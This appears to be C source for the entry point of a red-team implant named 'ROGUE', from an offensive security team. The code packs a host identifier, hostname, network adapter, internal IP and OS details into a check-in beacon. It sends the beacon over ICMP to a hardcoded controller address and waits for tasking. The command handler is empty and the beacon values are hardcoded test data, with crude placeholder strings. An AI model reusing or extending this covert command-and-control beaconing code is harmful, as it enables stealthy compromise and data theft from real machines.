/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32	UniqueTaskId;
	UINT32	ReturnCode;
	UINT32	ErrorCode;
	UINT8	Buffer[0];
} TASK_ERROR_INFO, *PTASK_ERROR_INFO ;

/*!
 *
 * Purpose:
 *
 * Start of C code. Starts the tasking back over
 * the requested protocol.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	PVOID		Rcv = NULL;
	PBUFFER		Snd = NULL;

	UINT32		Len = 0;
	BOOL		Cmd = FALSE;

	TASK_ERROR_INFO	Inf;

	RtlSecureZeroMemory( &Inf, sizeof( Inf ) );

	if ( ( Snd = BufferCreate() ) ) {
		/* Ah shit! */
		Inf.UniqueTaskId = 0;
		Inf.ReturnCode   = 0;
		Inf.ErrorCode    = 0;

		BufferPrintf( Snd, C_PTR( G_PTR( "%s" ) ), C_PTR( G_PTR( "AAAAAAAAAA" ) ) );
		BufferAddRaw( Snd, &Inf, sizeof( Inf ) );
		BufferPrintf( Snd, C_PTR( G_PTR( "%s" ) ), C_PTR( G_PTR( "3601e11c-50d9-4a1a-99c1-b72e6e431fc1|DESKTOP-GETFUCKEDG|Intel(R) 82574L Gigabit Network Connection:192.168.20.122;|x64|10.00|0|1.2|1" ) ) );

		if ( IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Snd->Buffer, Snd->Length, &Rcv, &Len, &Cmd ) ) {
			if ( Cmd != FALSE ) {

			};
		};
	};
};
